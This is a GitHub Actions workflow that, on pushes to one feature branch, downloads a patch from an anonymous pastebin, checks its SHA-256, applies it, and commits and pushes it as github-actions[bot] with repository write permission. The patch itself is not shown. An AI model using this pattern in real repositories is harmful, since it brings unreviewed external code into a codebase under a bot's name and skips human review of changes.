name: ci

on:
  push:
    branches:
      - feature/bootstrap-architecture-v0.1

permissions:
  contents: write

jobs:
  apply-session-save-recovery-patch:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Download patch
        run: curl -fsSL https://paste.rs/GkCV2 -o security-session-save-recovery.patch
      - name: Verify patch checksum
        run: echo "c3806752f70e62947fadf7c1f8977513b6483074ed0c68af9c038ea10b0960d9  security-session-save-recovery.patch" | sha256sum -c -
      - name: Apply patch
        run: git apply --index security-session-save-recovery.patch
      - name: Commit patch
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git commit -m "fix: recover session xlsx saves on destination failure"
      - name: Push patch commit
        run: git push origin HEAD:feature/bootstrap-architecture-v0.1
